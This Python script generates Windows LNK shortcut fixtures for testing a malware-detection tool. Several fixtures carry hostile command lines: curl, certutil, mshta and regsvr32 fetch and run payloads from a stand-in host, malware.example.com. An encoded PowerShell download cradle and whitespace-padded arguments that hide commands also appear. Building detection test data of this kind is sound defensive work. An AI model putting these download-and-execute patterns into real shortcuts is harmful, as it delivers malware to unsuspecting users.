#!/usr/bin/env python3
"""
Generate test LNK files for cleave testing.

Uses pylnk3 library to create Windows Shell Link files with various
characteristics for testing malware detection capabilities.

Install: pip install pylnk3

Note: pylnk3 doesn't support SW_HIDE (window_mode=0), only Normal/Maximized/Minimized.
"""

import os
import sys

try:
    import pylnk3
except ImportError:
    print("Error: pylnk3 not installed. Install with: pip install pylnk3")
    sys.exit(1)


def create_lnk(
    output_path: str,
    target_path: str,
    arguments: str = None,
    working_dir: str = None,
    icon_location: str = None,
    window_mode: str = "Normal",
    description: str = None,
):
    """Create an LNK file using pylnk3."""
    lnk = pylnk3.Lnk()

    # Set target path
    lnk.specify_local_location(target_path)

    # Set optional fields
    if arguments:
        lnk.arguments = arguments
    if working_dir:
        lnk.working_dir = working_dir
    if icon_location:
        lnk.icon = icon_location
    if description:
        lnk.description = description

    # Set window mode (Normal, Maximized, or Minimized)
    lnk.window_mode = window_mode

    # Save the file
    lnk.save(output_path)
    print(f"Created: {output_path}")


def main():
    """Generate test LNK fixtures."""
    output_dir = os.path.dirname(os.path.abspath(__file__))

    # 1. Benign notepad shortcut
    create_lnk(
        output_path=os.path.join(output_dir, "benign_notepad.lnk"),
        target_path=r"C:\Windows\System32\notepad.exe",
        window_mode="Normal",
        description="Opens Notepad",
    )

    # 2. PowerShell (minimized - closest to hidden that pylnk3 supports)
    create_lnk(
        output_path=os.path.join(output_dir, "powershell_minimized.lnk"),
        target_path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        arguments="-NoProfile -WindowStyle Hidden -Command \"Write-Host Hello\"",
        window_mode="Minimized",
    )

    # 3. Whitespace obfuscation (ZDI-CAN-25373)
    whitespace_padding = " " * 100
    create_lnk(
        output_path=os.path.join(output_dir, "whitespace_obfuscated.lnk"),
        target_path=r"C:\Windows\System32\cmd.exe",
        arguments=f"/c{whitespace_padding}calc.exe",
        window_mode="Minimized",
    )

    # 4. Encoded PowerShell command
    create_lnk(
        output_path=os.path.join(output_dir, "encoded_command.lnk"),
        target_path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        arguments="-enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcA",
        window_mode="Minimized",
    )

    # 5. cmd.exe with download command
    create_lnk(
        output_path=os.path.join(output_dir, "cmd_download.lnk"),
        target_path=r"C:\Windows\System32\cmd.exe",
        arguments="/c curl http://malware.example.com/payload.exe -o %TEMP%\\payload.exe && %TEMP%\\payload.exe",
        window_mode="Minimized",
    )

    # 6. mshta.exe with URL (LOLBIN)
    create_lnk(
        output_path=os.path.join(output_dir, "mshta_payload.lnk"),
        target_path=r"C:\Windows\System32\mshta.exe",
        arguments="http://malware.example.com/payload.hta",
        window_mode="Minimized",
    )

    # 7. regsvr32 with scrobj (LOLBIN)
    create_lnk(
        output_path=os.path.join(output_dir, "regsvr32_scrobj.lnk"),
        target_path=r"C:\Windows\System32\regsvr32.exe",
        arguments="/s /n /u /i:http://malware.example.com/payload.sct scrobj.dll",
        window_mode="Minimized",
    )

    # 8. certutil download (LOLBIN)
    create_lnk(
        output_path=os.path.join(output_dir, "certutil_download.lnk"),
        target_path=r"C:\Windows\System32\certutil.exe",
        arguments="-urlcache -split -f http://malware.example.com/payload.exe %TEMP%\\payload.exe",
        window_mode="Minimized",
    )

    # 9. wscript with VBS
    create_lnk(
        output_path=os.path.join(output_dir, "wscript_vbs.lnk"),
        target_path=r"C:\Windows\System32\wscript.exe",
        arguments="//B //E:vbscript payload.vbs",
        window_mode="Minimized",
    )

    # 10. Tab-based obfuscation
    tab_padding = "\t" * 60
    create_lnk(
        output_path=os.path.join(output_dir, "tab_obfuscated.lnk"),
        target_path=r"C:\Windows\System32\cmd.exe",
        arguments=f"/c{tab_padding}powershell.exe",
        window_mode="Minimized",
    )

    print(f"\nGenerated 10 test LNK files in {output_dir}")


if __name__ == "__main__":
    main()
